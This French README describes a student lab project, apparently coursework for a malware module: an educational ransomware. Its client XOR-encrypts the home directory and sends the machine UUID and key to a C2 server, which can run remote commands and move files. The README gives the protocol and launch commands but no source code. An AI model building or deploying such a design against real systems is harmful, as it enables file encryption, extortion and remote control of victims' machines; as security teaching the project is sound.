# Projet : ransomware pédagogique IPSSI
Groupe: Fedi EL Manoubi ((Projet effectué tout seul (solo))
## 1. Présentation générale
Ce projet a été réalisé dans le cadre du module "Malware et sécurité offensive". L'objectif est de simuler le fonctionnement d'un ransomware moderne (chiffrement, exfiltration de clé, contrôle à distance) dans un environnement de laboratoire sécurisé.

**Attention :** Ce programme est à but pédagogique uniquement. Ne pas exécuter hors d'une VM.

## 2. Fonctionnalités implémentées
Conformément à la Partie 1 du sujet, les éléments suivants sont fonctionnels :
* **Identification unique** : Récupération de l'UUID de la machine via `/proc/sys/kernel/random/uuid`.
* **Génération de clé** : Création d'une clé de 16 caractères (A-Z) à partir de `/dev/urandom`.
* **Chiffrement récursif** : Parcours complet du répertoire "Home" et chiffrement des fichiers via l'algorithme XOR.
* **Serveur de contrôle (C2)** : Gestion multi-clients via `select` permettant :
    * L'exfiltration automatique de l'UUID et de la clé à la connexion.
    * L'exécution de commandes système à distance.
    * L'upload et le download de fichiers (encodage Base64).
    * Le déclenchement du chiffrement/déchiffrement à distance.

## 3. Architecture globale
Le projet utilise une architecture **Client/Serveur** basée sur le protocole TCP :
* **Le Serveur (C2)** : Reste en écoute sur le port 5000. Il gère une file d'attente de clients et permet à l'administrateur d'envoyer des ordres via une console interactive.
* **Le Client (Malware)** : Se connecte au serveur, envoie ses informations d'identification, puis entre dans une boucle d'attente d'ordres (polling).

## 4. Fonctionnement du protocole
Les échanges se font en texte clair (sauf les données de fichiers en Base64) :
1. **HELLO <uuid> <key>** : Envoyé par le client à la connexion.
2. **RUN_XOR** : Ordre du serveur pour chiffrer/déchiffrer les fichiers.
3. **EXEC <cmd>** : Ordre d'exécution système (ex: `ls`, `whoami`).
4. **UPLOAD <path>** / **DOWNLOAD <dest> <data>** : Transfert de fichiers.

## 5. Comment lancer le projet
1. **Lancer le serveur** (sur la machine attaquante) :
   ```bash
   python3 server.py 0.0.0.0 5000

   python3 client.py <IP_SERVEUR> 5000
